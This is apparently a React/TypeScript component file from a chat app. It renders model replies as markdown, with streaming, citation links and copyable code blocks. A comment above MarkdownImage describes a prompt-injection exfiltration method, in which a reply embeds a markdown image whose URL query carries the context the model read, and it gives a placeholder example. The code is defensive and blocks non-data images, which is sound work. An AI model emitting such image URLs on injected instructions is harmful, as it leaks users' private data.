import { memo, useMemo, useRef, useState } from 'react'
import ReactMarkdown, { type Components } from 'react-markdown'
import remarkGfm from 'remark-gfm'
import remarkMath from 'remark-math'
import rehypeKatex from 'rehype-katex'
import rehypeHighlight from 'rehype-highlight'
import { openFence, splitSettled, useThrottled } from '../lib/stream'
import { App, type store as storeTypes } from '../lib/api'
import { useStore } from '../store'

/*
 * Raw HTML is deliberately NOT enabled. Scraped pages reach the model's context
 * and can be echoed back in a reply; rendering their markup would turn a
 * research tool into an injection surface. Markdown is plenty.
 */

/*
 * The plugin list, the overrides and the <a> component are module constants on
 * purpose: an inline component is a different element type to React on every
 * render, so it unmounts and remounts the node it wraps. For a link inside a
 * streaming reply that was a visible flash twenty times a second.
 */
const REMARK_PLUGINS = [remarkGfm, remarkMath]
const REHYPE_PLUGINS = [rehypeKatex, rehypeHighlight]
const COMPONENTS: Components = {
  pre: CodeBlock as never,
  a: MarkdownLink,
  img: MarkdownImage,
}

/*
 * A picture in a reply, without fetching it.
 *
 * react-markdown turns `![alt](url)` into an `<img>`, and the webview loads whatever
 * `src` it is given — which makes a markdown image an outbound request whose
 * destination and query string are chosen by the model, or by a page the model
 * scraped. That is a working exfiltration channel for a prompt-injected turn: the reply
 * embeds `![](https://somewhere/?q=<the context it just read>)` and the request leaves
 * the machine without anyone clicking anything. Links were already safe because they
 * only open on a click (MarkdownLink); images are not a click.
 *
 * So only an inline data picture is rendered. KiChat's own pictures arrive as data URLs
 * from the attachment store and are drawn by MessageImages, never by markdown, so
 * nothing the app shows loses a picture to this rule. The rest of the image is kept as
 * its alt text, because the words are the model's and a silent gap reads as a bug.
 */
function MarkdownImage({ src, alt }: React.ComponentPropsWithoutRef<'img'>) {
  const url = typeof src === 'string' ? src : ''
  if (url.startsWith('data:image/')) {
    return <img src={url} alt={alt} />
  }
  return alt ? <span className="faint">{alt}</span> : null
}

export const Markdown = memo(function Markdown({ text, streaming = false, sources }: MarkdownProps) {
  // One map for the whole reply: the numbers are the turn's, so a marker resolves the
  // same way in every piece of a streamed answer. Memoised on the array identity, which
  // only changes when the stored message is reloaded with its list.
  const citations = useMemo(() => citationMap(sources), [sources])
  return (
    <div className="md">
      {/*
        A finished message is one document again, so the markdown that reaches
        the screen is exactly what the spec says it is: a list written with
        blank lines between its items stays one loose list, `[text][ref]`
        resolves against a definition further down, footnotes collect at the
        end. Streaming splits the text, and a split cannot promise those.
      */}
      {streaming ? <StreamingMarkdown text={text} citations={citations} /> : <Block source={text} citations={citations} />}
    </div>
  )
})

/*
 * Citations.
 *
 * A model cites the search results it read as `[3]`, and until the numbers were unique
 * per turn there was no page that `[3]` could point at. Now there is: the answer is
 * stored with the numbered sources of its turn, and a marker becomes a link to the same
 * entry the source list shows. Only the bracketed form is rewritten — a bare `3` in a
 * table would hit dates and quantities — and a number with no source behind it is left
 * as the model wrote it, because a link to the wrong page is worse than a dead marker.
 */
const CITATION = /\[(\d{1,3})\]/g

function citationMap(sources?: storeTypes.Source[]): Map<number, storeTypes.Source> | null {
  if (!sources || sources.length === 0) return null
  const map = new Map<number, storeTypes.Source>()
  for (const source of sources) {
    if (source.url) map.set(source.index, source)
  }
  return map.size > 0 ? map : null
}

type MdNode = {
  type: string
  value?: string
  url?: string
  title?: string
  children?: MdNode[]
}

function remarkCitations(citations: Map<number, storeTypes.Source>) {
  return () => (tree: MdNode) => {
    walkCitations(tree, citations)
  }
}

function walkCitations(node: MdNode, citations: Map<number, storeTypes.Source>) {
  if (!node.children || node.type === 'link') return
  const out: MdNode[] = []
  for (const child of node.children) {
    if (child.type !== 'text' || !child.value) {
      walkCitations(child, citations)
      out.push(child)
      continue
    }
    let rest = child.value
    let match: RegExpExecArray | null
    CITATION.lastIndex = 0
    while ((match = CITATION.exec(rest))) {
      const index = Number(match[1])
      const source = citations.get(index)
      if (!source) continue
      const start = match.index
      if (start > 0) out.push({ type: 'text', value: rest.slice(0, start) })
      out.push({
        type: 'link',
        url: source.url,
        title: source.title || source.url,
        children: [{ type: 'text', value: match[0] }],
      })
      rest = rest.slice(start + match[0].length)
      CITATION.lastIndex = 0
    }
    if (rest) out.push({ type: 'text', value: rest })
  }
  node.children = out
}

/**
 * A reply that is still arriving, in the two parts `stream.ts` describes: the
 * pieces that are finished and can be rendered once, and the piece being
 * written.
 */
function StreamingMarkdown({ text, citations }: { text: string; citations: Map<number, storeTypes.Source> | null }) {
  // Re-splitting is a cheap scan; the parse the pieces trigger is not, and that
  // is what the memo inside Block keeps from happening per delta.
  const { settled, live } = useMemo(() => splitSettled(text), [text])
  return (
    <>
      {/* An index is the right key here: pieces only ever get appended, so the
          key of a piece never changes and its memo keeps holding. */}
      {settled.map((chunk, index) => (
        <Block key={index} source={chunk} citations={citations} />
      ))}
      <LivePiece source={live} citations={citations} />
      {/*
        The cursor is part of the stream, not a thing that comes and goes: it
        used to be hidden whenever the throttled text had caught up with the
        store, which restarted its blink animation and re-wrapped the line it
        sits in — a flicker with every commit.
      */}
      <span className="streaming-cursor" />
    </>
  )
}

/**
 * The piece a reply is writing right now. Its parse is rationed, and inside a
 * fenced code block there is no parse at all: markdown never reads code, so it
 * is shown as the plain text it is and gets its colours once the fence closes.
 */
function LivePiece({ source, citations }: { source: string; citations: Map<number, storeTypes.Source> | null }) {
  // Always active: this component only exists while the reply is streaming, and
  // it unmounts when it is not.
  const shown = useThrottled(source, true, 90)
  const fence = useMemo(() => openFence(source), [source])

  if (fence) {
    // The same classes rehype-highlight would put on a closed fence with a
    // language, so the code does not change colour when the fence closes. No
    // language means no class at all, which is also what the highlight step
    // leaves behind.
    const language = fence.lang ? `hljs language-${fence.lang}` : undefined
    return (
      <>
        {fence.before.trim() ? <Block source={fence.before} citations={citations} /> : null}
        <CodeBlock>
          <code className={language}>{fence.code}</code>
        </CodeBlock>
      </>
    )
  }
  return <Block source={shown} citations={citations} />
}

/**
 * One piece of a reply, parsed once. This memo is the fix, not an optimisation:
 * a piece the reply has already finished writing never changes again, so
 * parsing it again — which is what happened on every delta — is pure waste that
 * grows with the length of the answer.
 */
const Block = memo(function Block({
  source,
  citations,
}: {
  source: string
  citations: Map<number, storeTypes.Source> | null
}) {
  // The plugin list is a new array only when the sources change, so the memo above still
  // holds for every settled piece of a long streamed answer.
  const plugins = useMemo(
    () => (citations ? [...REMARK_PLUGINS, remarkCitations(citations)] : REMARK_PLUGINS),
    [citations],
  )
  return (
    <ReactMarkdown remarkPlugins={plugins} rehypePlugins={REHYPE_PLUGINS} components={COMPONENTS}>
      {source}
    </ReactMarkdown>
  )
})

// Links must open in the user's browser: letting the webview navigate would
// replace the entire app UI with the target page.
function MarkdownLink({ href, children, ...rest }: React.ComponentPropsWithoutRef<'a'>) {
  return (
    <a
      {...rest}
      href={href}
      onClick={(event) => {
        event.preventDefault()
        if (href) void App.OpenExternal(href)
      }}
    >
      {children}
    </a>
  )
}

function CodeBlock({ children, ...rest }: React.HTMLAttributes<HTMLPreElement>) {
  const ref = useRef<HTMLPreElement>(null)
  const [copied, setCopied] = useState(false)
  const t = useStore((s) => s.t)

  const copy = () => {
    const text = ref.current?.innerText ?? ''
    navigator.clipboard.writeText(text).then(
      () => {
        setCopied(true)
        window.setTimeout(() => setCopied(false), 1500)
      },
      () => undefined,
    )
  }

  return (
    <div className="relative group">
      <pre ref={ref} {...rest}>
        {children}
      </pre>
      <button
        type="button"
        onClick={copy}
        className="btn btn-sm btn-ghost absolute top-1.5 right-1.5 opacity-0 group-hover:opacity-100 transition-opacity"
        style={{ background: 'var(--surface-2)' }}
      >
        {copied ? t('chat.copied') : t('chat.copy')}
      </button>
    </div>
  )
}

interface MarkdownProps {
  text: string
  streaming?: boolean
  /** The numbered sources of the turn this answer belongs to, when it has any. */
  sources?: storeTypes.Source[]
}

